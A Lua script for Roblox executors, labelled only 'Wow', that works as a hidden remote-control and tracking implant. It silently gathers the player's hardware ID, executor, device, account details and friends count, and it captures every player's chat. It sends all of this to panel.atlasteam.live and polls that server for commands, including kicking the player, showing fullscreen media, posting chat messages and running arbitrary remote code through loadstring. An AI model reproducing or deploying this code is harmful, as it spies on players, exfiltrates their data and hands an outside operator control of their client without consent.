LPH_NO_VIRTUALIZE = LPH_NO_VIRTUALIZE or function(f)
    return f
end

LPH_NO_VIRTUALIZE(function()
pcall(function()
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local HttpService = game:GetService("HttpService")
    local UserInputService = game:GetService("UserInputService")
    local player = Players.LocalPlayer

    local SCRIPT_ID = "1"
    local SCRIPT_NAME = "Wow"
    local COMMAND_INTERVAL = 1
    local HEARTBEAT_INTERVAL = 10
    local INFO_CONFIG_JSON = "{\"avatar_url\":true,\"hwid\":true,\"device\":true,\"executor\":true,\"account_age\":true,\"join_date\":true,\"friends_count\":true,\"premium_status\":true,\"health\":true,\"server_player_count\":true}"
    local INFO_CONFIG = {}
    pcall(function()
        local decoded = HttpService:JSONDecode(INFO_CONFIG_JSON)
        if type(decoded) == "table" then INFO_CONFIG = decoded end
    end)

    local SERVERS = {
        "https://panel.atlasteam.live"
    }

    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local function enc(v)
        v = tostring(v or "")
        local ok, encoded = pcall(function() return HttpService:UrlEncode(v) end)
        if ok and encoded then return encoded end
        return v:gsub("\n", " "):gsub(" ", "%%20")
    end

    local function buildQuery(data)
        local parts = {}
        for k, v in pairs(data) do
            table.insert(parts, enc(k) .. "=" .. enc(v))
        end
        return table.concat(parts, "&")
    end

    local function apiGet(path, data)
        local query = buildQuery(data)
        for _, server in ipairs(SERVERS) do
            local ok, body = pcall(function()
                return game:HttpGet(server .. path .. "?" .. query .. "&_t=" .. tostring(os.time()), true)
            end)
            if ok and body and body:find('"ok"%s*:%s*true') then
                return true
            end
            task.wait(0.2)
        end
        return false
    end

    local function getPlayerCount()
        local n = 0
        for _ in pairs(Players:GetPlayers()) do n = n + 1 end
        return n
    end

    local function getTeleportCommand()
        return 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(game.PlaceId) .. ', "' .. tostring(game.JobId) .. '")'
    end

    local function getDevice()
        if UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
            return "PC / 模拟器"
        end
        return "Android / IOS / Unknown"
    end

    local function getExecutor()
        local ok, value = pcall(function()
            if identifyexecutor then return identifyexecutor() end
            return "Unknown"
        end)
        return ok and tostring(value or "Unknown") or "Unknown"
    end

    local function requestJson(reqTable)
        local req = http_request or request or HttpPost or syn and syn.request
        if not req then return nil end
        local ok, res = pcall(function() return req(reqTable) end)
        if not ok or not res then return nil end
        local body = res.Body or res.body
        if not body then return nil end
        local ok2, json = pcall(function() return HttpService:JSONDecode(body) end)
        if not ok2 then return nil end
        return json
    end

    local function validText(value)
        value = tostring(value or "")
        if value == "" or value == "N/A" or value == "Unknown" or value == "未知" or value == "nil" or value == "null" then return "" end
        return value
    end

    local function getAvatarUrl()
        local urls = {
            ("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=180x180&format=Png&isCircular=true"):format(player.UserId),
            ("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true"):format(player.UserId)
        }
        for _, url in ipairs(urls) do
            local ok, body = pcall(function() return game:HttpGet(url, true) end)
            if ok and body then
                local ok2, decoded = pcall(function() return HttpService:JSONDecode(body) end)
                if ok2 and decoded and decoded.data and decoded.data[1] then
                    local imageUrl = validText(decoded.data[1].imageUrl)
                    if imageUrl ~= "" then return imageUrl end
                end
            end
        end
        return ""
    end

    local function getHwid()
        local checks = {
            function() return gethwid and gethwid() end,
            function() return get_hwid and get_hwid() end,
            function() return getexecutorhwid and getexecutorhwid() end,
            function() return getfingerprint and getfingerprint() end,
            function() return fingerprint and fingerprint() end,
            function() return syn and syn.gethwid and syn.gethwid() end,
            function() return syn and syn.get_hwid and syn.get_hwid() end,
            function() return KRNL_LOADED and gethwid and gethwid() end
        }
        for _, fn in ipairs(checks) do
            local ok, value = pcall(fn)
            value = ok and validText(value) or ""
            if value ~= "" then return value end
        end
        local json = requestJson({ Url = "https://httpbin.org/get", Method = "GET" })
        if json and json.headers then
            for k, v in pairs(json.headers) do
                local name = tostring(k):lower()
                if name:find("fingerprint") or name:find("hwid") or name:find("identifier") then
                    local value = validText(v)
                    if value ~= "" then return value end
                end
            end
        end
        return ""
    end

    local function getJoinDate()
        local joinTime = os.time() - (tonumber(player.AccountAge) or 0) * 86400
        local joinDate = os.date("!*t", joinTime)
        if not joinDate then return "" end
        return tostring(joinDate.year) .. " / " .. tostring(joinDate.month) .. " / " .. tostring(joinDate.day)
    end

    local function getPremiumStatus()
        local ok, membership = pcall(function() return player.MembershipType end)
        if not ok then return "" end
        if membership == Enum.MembershipType.Premium then return "是" end
        return "否"
    end

    local function getFriendsCount()
        local json = requestJson({ Url = ("https://friends.roblox.com/v1/users/%d/friends/count"):format(player.UserId), Method = "GET" })
        if json and tonumber(json.count) then return tostring(tonumber(json.count)) end
        local ok, pages = pcall(function() return Players:GetFriendsAsync(player.UserId) end)
        if not ok or not pages then return "" end
        local total = 0
        local guard = 0
        while guard < 25 do
            guard = guard + 1
            local okPage, page = pcall(function() return pages:GetCurrentPage() end)
            if okPage and page then total = total + #page end
            local done = false
            pcall(function() done = pages.IsFinished end)
            if done then break end
            local okNext = pcall(function() pages:AdvanceToNextPageAsync() end)
            if not okNext then break end
        end
        return tostring(total)
    end

    local function infoEnabled(key)
        local value = INFO_CONFIG and INFO_CONFIG[key]
        if value == false then return false end
        return true
    end

    local function buildStaticProfile()
        local profile = {}
        if infoEnabled("avatar_url") then profile.avatar_url = getAvatarUrl() end
        if infoEnabled("hwid") then profile.hwid = getHwid() end
        if infoEnabled("device") then profile.device = getDevice() end
        if infoEnabled("executor") then profile.executor = getExecutor() end
        if infoEnabled("account_age") then profile.account_age = tostring(player.AccountAge) .. "天" end
        if infoEnabled("join_date") then profile.join_date = getJoinDate() end
        if infoEnabled("friends_count") then profile.friends_count = getFriendsCount() end
        if infoEnabled("premium_status") then profile.premium_status = getPremiumStatus() end
        return profile
    end

    local staticProfile = buildStaticProfile()

    local function fileExtFromUrl(url, fallback)
        url = tostring(url or ""):lower()
        local ext = url:match("%.([a-z0-9]+)%?") or url:match("%.([a-z0-9]+)$")
        if ext and #ext <= 5 then return ext end
        return fallback or "bin"
    end

    local function extFromMime(mime, fallback)
        mime = tostring(mime or ""):lower()
        local map = {
            ["image/png"] = "png", ["image/jpeg"] = "jpg", ["image/jpg"] = "jpg", ["image/webp"] = "webp", ["image/gif"] = "gif",
            ["audio/mpeg"] = "mp3", ["audio/mp3"] = "mp3", ["audio/ogg"] = "ogg", ["audio/wav"] = "wav", ["audio/x-wav"] = "wav", ["audio/mp4"] = "m4a",
            ["video/mp4"] = "mp4", ["video/webm"] = "webm", ["video/ogg"] = "ogv"
        }
        return map[mime] or fallback or "bin"
    end

    local function base64Decode(data)
        data = tostring(data or "")
        if data == "" then return "" end
        local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        data = data:gsub("[^A-Za-z0-9%+/%=]", "")
        return (data:gsub(".", function(x)
            if x == "=" then return "" end
            local index = alphabet:find(x, 1, true)
            if not index then return "" end
            local value = index - 1
            local bits = ""
            for i = 6, 1, -1 do
                bits = bits .. (value % 2 ^ i - value % 2 ^ (i - 1) > 0 and "1" or "0")
            end
            return bits
        end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(bits)
            if #bits ~= 8 then return "" end
            local byte = 0
            for i = 1, 8 do
                if bits:sub(i, i) == "1" then byte = byte + 2 ^ (8 - i) end
            end
            return string.char(byte)
        end))
    end

    local function normalizeRobloxAsset(source)
        source = tostring(source or ""):gsub("^%s+", ""):gsub("%s+$", "")
        if source == "" then return "" end
        if source:match("^%d+$") then return "rbxassetid://" .. source end
        local id = source:match("[?&]id=(%d+)") or source:match("/library/(%d+)") or source:match("/catalog/(%d+)") or source:match("/asset/%?id=(%d+)")
        if id then return "rbxassetid://" .. id end
        return source
    end

    local function requestBody(url)
        url = tostring(url or "")
        local req = http_request or request or HttpGet or syn and syn.request
        if req then
            local ok, res = pcall(function()
                return req({ Url = url, Method = "GET" })
            end)
            if ok and res then
                return res.Body or res.body
            end
        end
        local ok, body = pcall(function() return game:HttpGet(url, true) end)
        if ok then return body end
        return nil
    end

    local function mediaSource(source, kind, encodedData, mime)
        source = normalizeRobloxAsset(source)
        encodedData = tostring(encodedData or "")
        local fallbackExt = kind == "image" and "png" or kind == "video" and "mp4" or kind == "sound" and "mp3" or "bin"

        if encodedData ~= "" and writefile and getcustomasset then
            local ext = extFromMime(mime, fileExtFromUrl(source, fallbackExt))
            local name = "atlas_media_" .. tostring(kind or "file") .. "_" .. tostring(math.random(100000,999999)) .. "." .. ext
            local body = base64Decode(encodedData)
            if body and body ~= "" then
                local okWrite = pcall(function() writefile(name, body) end)
                if okWrite then
                    local okAsset, asset = pcall(function() return getcustomasset(name) end)
                    if okAsset and asset and tostring(asset) ~= "" then return tostring(asset) end
                end
            end
        end

        if source == "" then return "" end
        if not source:match("^https?://") then return source end
        if not (writefile and getcustomasset) then return source end

        local ext = fileExtFromUrl(source, fallbackExt)
        local name = "atlas_media_" .. tostring(kind or "file") .. "_" .. tostring(math.random(100000,999999)) .. "." .. ext
        local body = requestBody(source)
        if not body or body == "" then return source end
        local okWrite = pcall(function() writefile(name, body) end)
        if not okWrite then return source end
        local okAsset, asset = pcall(function() return getcustomasset(name) end)
        if okAsset and asset and tostring(asset) ~= "" then return tostring(asset) end
        return source
    end

    local function parentGui()
        local gui = nil
        pcall(function() gui = game:GetService("CoreGui") end)
        if not gui then gui = player:WaitForChild("PlayerGui") end
        return gui
    end

    local function addStatusLabel(screenGui, text)
        local label = Instance.new("TextLabel")
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1,1,1)
        label.TextStrokeTransparency = 0.35
        label.Font = Enum.Font.GothamBold
        label.TextSize = 18
        label.Text = tostring(text or "")
        label.Size = UDim2.new(1, -24, 0, 40)
        label.Position = UDim2.new(0, 12, 1, -52)
        label.ZIndex = 10000
        label.Parent = screenGui
        return label
    end

    local function showFullscreenImage(imageUrl, seconds, soundUrl, imageData, imageMime, soundData, soundMime)
        seconds = tonumber(seconds) or 5
        if seconds < 1 then seconds = 1 end
        if seconds > 60 then seconds = 60 end

        local imageSource = mediaSource(imageUrl, "image", imageData, imageMime)
        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if imageSource == "" then return end

        local mediaPlayer = Instance.new("ScreenGui")
        mediaPlayer.Name = "MediaPlayer_" .. math.random(100000,999999)
        mediaPlayer.ResetOnSpawn = false
        mediaPlayer.IgnoreGuiInset = true
        mediaPlayer.DisplayOrder = 999999

        local image = Instance.new("ImageLabel")
        image.Image = imageSource
        image.Size = UDim2.new(1,0,1,0)
        image.BackgroundColor3 = Color3.new(0,0,0)
        image.ScaleType = Enum.ScaleType.Fit
        image.ZIndex = 9999
        image.Parent = mediaPlayer
        local status = addStatusLabel(mediaPlayer, "Loading image...")

        if soundSource ~= "" then
            local sound = Instance.new("Sound")
            sound.SoundId = soundSource
            sound.Volume = 10
            sound.Parent = mediaPlayer
            pcall(function() sound:Play() end)
        end

        mediaPlayer.Parent = parentGui()
        task.spawn(function()
            local start = os.clock()
            while os.clock() - start < 8 do
                local loaded = false
                pcall(function() loaded = image.IsLoaded end)
                if loaded then
                    pcall(function() status:Destroy() end)
                    break
                end
                task.wait(0.2)
            end
            pcall(function()
                if status and status.Parent then status.Text = "Image failed to load: use Roblox asset id or supported executor upload" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() mediaPlayer:Destroy() end)
        end)
    end

    local function showFullscreenVideo(videoUrl, seconds, soundUrl, videoData, videoMime, soundData, soundMime)
        seconds = tonumber(seconds) or 10
        if seconds < 1 then seconds = 1 end
        if seconds > 120 then seconds = 120 end

        local videoSource = mediaSource(videoUrl, "video", videoData, videoMime)
        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if videoSource == "" then return end

        local mediaPlayer = Instance.new("ScreenGui")
        mediaPlayer.Name = "VideoPlayer_" .. math.random(100000,999999)
        mediaPlayer.ResetOnSpawn = false
        mediaPlayer.IgnoreGuiInset = true
        mediaPlayer.DisplayOrder = 999999

        local video = Instance.new("VideoFrame")
        video.Video = videoSource
        video.Size = UDim2.new(1,0,1,0)
        video.BackgroundColor3 = Color3.new(0,0,0)
        video.ZIndex = 9999
        video.Looped = true
        video.Parent = mediaPlayer
        local status = addStatusLabel(mediaPlayer, "Loading video...")

        if soundSource ~= "" then
            local sound = Instance.new("Sound")
            sound.SoundId = soundSource
            sound.Volume = 10
            sound.Parent = mediaPlayer
            pcall(function() sound:Play() end)
        end

        mediaPlayer.Parent = parentGui()
        pcall(function() video:Play() end)
        task.spawn(function()
            task.wait(2)
            pcall(function()
                if video.IsLoaded then status:Destroy() else status.Text = "Video failed to load: use Roblox video asset id or supported local file executor" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() mediaPlayer:Destroy() end)
        end)
    end

    local function playSoundOnly(soundUrl, seconds, soundData, soundMime)
        seconds = tonumber(seconds) or 10
        if seconds < 1 then seconds = 1 end
        if seconds > 120 then seconds = 120 end

        local soundSource = mediaSource(soundUrl, "sound", soundData, soundMime)
        if soundSource == "" then return end

        local soundGui = Instance.new("ScreenGui")
        soundGui.Name = "SoundPlayer_" .. math.random(100000,999999)
        soundGui.ResetOnSpawn = false
        soundGui.IgnoreGuiInset = true
        soundGui.DisplayOrder = 999999
        local status = addStatusLabel(soundGui, "Playing sound...")

        local sound = Instance.new("Sound")
        sound.SoundId = soundSource
        sound.Volume = 10
        sound.Parent = soundGui

        soundGui.Parent = parentGui()
        pcall(function() sound:Play() end)
        task.spawn(function()
            task.wait(2)
            pcall(function()
                if sound.IsLoaded or sound.TimeLength > 0 then status.Text = "Sound playing" else status.Text = "Sound failed to load: use Roblox audio asset id or supported local file executor" end
            end)
        end)
        task.delay(seconds, function()
            pcall(function() soundGui:Destroy() end)
        end)
    end

    local function sendChatMessage(message)
        message = tostring(message or "")
        if message == "" then return end
        local sent = false
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            local channels = TextChatService:FindFirstChild("TextChannels")
            local general = channels and channels:FindFirstChild("RBXGeneral")
            if general then
                general:SendAsync(message)
                sent = true
            end
        end)
        if sent then return end
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
        end)
    end

    local function sendNotification(title, message, seconds)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = tostring(title or "通知"),
                Text = tostring(message or ""),
                Duration = tonumber(seconds) or 5
            })
        end)
    end

    local function executeRemoteCode(code)
        if type(code) ~= "string" or code == "" then return end
        local loader = loadstring or load
        if not loader then return end
        local ok, fn = pcall(loader, code)
        if ok and type(fn) == "function" then
            task.spawn(function() pcall(fn) end)
        end
    end


    local chatRecent = {}

    local function reportChatFields(senderUserId, senderUsername, senderDisplayName, message)
        message = tostring(message or "")
        message = message:gsub("^%s+", ""):gsub("%s+$", "")
        if message == "" then return end
        if #message > 300 then message = message:sub(1, 300) end
        senderUserId = tostring(senderUserId or "")
        senderUsername = tostring(senderUsername or senderUserId or "")
        senderDisplayName = tostring(senderDisplayName or "")
        local key = senderUserId .. "|" .. message
        local now = os.clock()
        if chatRecent[key] and now - chatRecent[key] < 1.5 then return end
        chatRecent[key] = now
        apiGet("/api/chat-report", {
            user_id = tostring(player.UserId),
            reporter_user_id = tostring(player.UserId),
            username = player.Name,
            game_name = gameName,
            server_id = game.JobId,
            script_id = SCRIPT_ID,
            sender_user_id = senderUserId,
            sender_username = senderUsername,
            sender_display_name = senderDisplayName,
            message = message
        })
    end

    local function reportPlayerChat(plr, message)
        if not plr then return end
        reportChatFields(tostring(plr.UserId), plr.Name, plr.DisplayName, message)
    end

    local hookedChatPlayers = {}

    local function hookPlayerChat(plr)
        if not plr or hookedChatPlayers[plr] then return end
        hookedChatPlayers[plr] = true
        pcall(function()
            plr.Chatted:Connect(function(message)
                reportPlayerChat(plr, message)
            end)
        end)
    end

    local function startChatCapture()
        for _, plr in ipairs(Players:GetPlayers()) do
            hookPlayerChat(plr)
        end
        Players.PlayerAdded:Connect(function(plr)
            hookPlayerChat(plr)
        end)
        pcall(function()
            local TextChatService = game:GetService("TextChatService")
            TextChatService.MessageReceived:Connect(function(chatMessage)
                local text = chatMessage and chatMessage.Text or ""
                local source = chatMessage and chatMessage.TextSource
                if source and source.UserId then
                    local sourcePlayer = Players:GetPlayerByUserId(source.UserId)
                    if sourcePlayer then
                        reportPlayerChat(sourcePlayer, text)
                    else
                        reportChatFields(tostring(source.UserId), tostring(source.Name or source.UserId), "", text)
                    end
                end
            end)
        end)
    end

    local function checkCommands()
        local query = buildQuery({
            user_id = tostring(player.UserId),
            game_name = gameName,
            server_id = game.JobId,
            script_id = SCRIPT_ID
        })

        for _, server in ipairs(SERVERS) do
            local ok, body = pcall(function()
                return game:HttpGet(server .. "/api/commands?" .. query .. "&_t=" .. tostring(os.clock()), true)
            end)

            if ok and body then
                local success, data = pcall(HttpService.JSONDecode, HttpService, body)
                if success and data and data.command then
                    local cmd = data.command

                    if cmd.type == "kick" then
                        player:Kick(tostring(cmd.message or "Kicked by admin"))
                    elseif cmd.type == "image" then
                        showFullscreenImage(cmd.image_url, cmd.seconds, cmd.sound_url, cmd.image_data, cmd.image_mime, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "video" then
                        showFullscreenVideo(cmd.video_url, cmd.seconds, cmd.sound_url, cmd.video_data, cmd.video_mime, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "sound" then
                        playSoundOnly(cmd.sound_url, cmd.seconds, cmd.sound_data, cmd.sound_mime)
                    elseif cmd.type == "chat" then
                        sendChatMessage(cmd.message)
                    elseif cmd.type == "notify" then
                        sendNotification(cmd.title, cmd.message, cmd.seconds)
                    elseif cmd.type == "exec" then
                        executeRemoteCode(cmd.code)
                    end
                    return true
                end
            end
            task.wait(0.2)
        end
        return false
    end

    local function sendHeartbeat()
        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")

        local data = {
            user_id = tostring(player.UserId),
            username = player.Name,
            display_name = player.DisplayName,
            game_name = gameName,
            game_id = tostring(game.GameId),
            server_place_id = tostring(game.PlaceId),
            server_id = game.JobId,
            teleport_cmd = getTeleportCommand(),
            script_id = SCRIPT_ID,
            script_name = SCRIPT_NAME
        }

        if infoEnabled("health") then
            data.health = hum and math.floor(hum.Health) or 0
            data.max_health = hum and math.floor(hum.MaxHealth) or 0
        end
        if infoEnabled("server_player_count") then
            data.server_player_count = getPlayerCount()
            data.max_players = Players.MaxPlayers
        end

        pcall(function()
            for k, v in pairs(staticProfile) do
                data[k] = v
            end
        end)

        apiGet("/api/heartbeat-get", data)
    end

    sendHeartbeat()
    pcall(startChatCapture)

    task.spawn(function()
        while task.wait(COMMAND_INTERVAL) do
            pcall(checkCommands)
        end
    end)

    task.spawn(function()
        while task.wait(HEARTBEAT_INTERVAL) do
            pcall(sendHeartbeat)
        end
    end)
end)

end)()
